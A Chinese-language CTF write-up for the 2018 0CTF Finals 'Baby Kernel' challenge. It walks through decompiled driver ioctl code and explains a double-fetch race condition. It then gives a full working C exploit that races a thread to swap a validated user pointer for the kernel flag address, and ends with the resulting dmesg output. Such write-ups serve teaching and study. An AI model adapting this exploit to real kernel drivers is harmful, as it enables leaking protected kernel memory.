---
layout: post
title: 2018 0CTF Finals Baby Kernel
excerpt: "kernel pwn"
categories: [Writeup]
comments: true
---
存在问题的代码如下
```c
signed __int64 __fastcall baby_ioctl(__int64 a1, __int64 a2)
{
  __int64 v2; // rdx@1
  signed __int64 result; // rax@2
  int i; // [sp-5Ch] [bp-5Ch]@8
  __int64 v5; // [sp-58h] [bp-58h]@1

  _fentry__(a1, a2);
  v5 = v2;
  if ( (_DWORD)a2 == 0x6666 )
  {
    printk("Your flag is at %px! But I don't think you know it's content\n", flag);// 打印flag地址
    result = 0LL;
  }
  else if ( (_DWORD)a2 == 0x1337
         && !_chk_range_not_ok(v2, 16LL, *(_QWORD *)(current_task + 4952LL))// 判断a1+a2是否小于a3
         && !_chk_range_not_ok(*(_QWORD *)v5, *(_DWORD *)(v5 + 8), *(_QWORD *)(current_task + 4952LL))// 第三个参数是一个常量： 0x7ffffffff000
         && *(_DWORD *)(v5 + 8) == strlen(flag) )// v5+8就是flag的长度
  {
    for ( i = 0; i < strlen(flag); ++i )
    {
      if ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )// 用户输入的内容和硬编码比较,如果一致了,就通过printk把flag打印出来
        return 22LL;
    }
    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);// 打印flag值
    result = 0LL;
  }
  else
  {
    result = 14LL;
  }
  return result;
}
```
在0x1337中,分为两部分,第一部分
```c
 else if ( (_DWORD)a2 == 0x1337
         && !_chk_range_not_ok(v2, 16LL, *(_QWORD *)(current_task + 4952LL))// 判断a1+a2是否小于a3
         && !_chk_range_not_ok(*(_QWORD *)v5, *(_DWORD *)(v5 + 8), *(_QWORD *)(current_task + 4952LL))// 第三个参数是一个常量： 0x7ffffffff000
         && *(_DWORD *)(v5 + 8) == strlen(flag) )// v5+8就是flag的长度
```
第二部分
```c
  {
    for ( i = 0; i < strlen(flag); ++i )
    {
      if ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )// 用户输入的内容和硬编码比较,如果一致了,就通过printk把flag打印出来
        return 22LL;
    }
    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);// 打印flag值
    result = 0LL;
  }
```
我们可以在第一部分创建一个假的v5 struct通过验证,然后替换v5指针,让驱动读取到flag,exp如下
```c
//poc.c
//gcc poc.c -o poc -w -static -pthread
#include <string.h>
char *strstr(const char *haystack, const char *needle);
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <string.h>
char *strcasestr(const char *haystack, const char *needle);
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>

#define TRYTIME 0x1000
#define LEN 0x1000

struct attr
{
    char *flag;
    size_t len;
};
unsigned long long addr;
int finish =0;
char buf[LEN+1]={0};			//伪造的flag

void change_attr_value(void *s){
    struct attr * s1 = s; 
    while(finish==0){
    s1->flag = addr;
    }
}

int main(void)
{
 

    int addr_fd;
    char *idx;

    int fd = open("/dev/baby",0);
    int ret = ioctl(fd,0x6666);    
    pthread_t t1;
    struct attr t;

    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);   

    system("dmesg > /tmp/record.txt");				//通过dmesg查看flag的地址
    addr_fd = open("/tmp/record.txt",O_RDONLY);
    lseek(addr_fd,-LEN,SEEK_END);
    read(addr_fd,buf,LEN);
    close(addr_fd);
    idx = strstr(buf,"Your flag is at ");
    if (idx == 0){
        printf("[-]Not found addr");
        exit(-1);
    }
    else{
        idx+=16;
        addr = strtoull(idx,idx+16,16);
        printf("[+]flag addr: %p\n",addr);
    }

    t.len = 33;
    t.flag = buf;
    pthread_create(&t1, NULL, change_attr_value,&t);
    for(int i=0;i<TRYTIME;i++){
        ret = ioctl(fd, 0x1337, &t);
        t.flag = buf;		//In order to pass the first inspection,修改为伪造的flag
    }
    finish = 1;
    pthread_join(t1, NULL);	//等待线程结束
    close(fd);
    puts("[+]result is :");
    system("dmesg | grep flag");	//通过dmesg查看flag的内容
    return 0;
}
```
最终结果
```c
/ $ ./exp
                       [+]flag addr: 0xfc01e4028
                       [+]result is :
                       [   14.670075] Your flag is at fc01e4028! But I don't think you know it's
                        content
                       [   14.692555] Looks like the flag is not a secret anymore. So here is it flag{T
                       HIS_WILL_BE_YOUR_FLAG_1234}
```
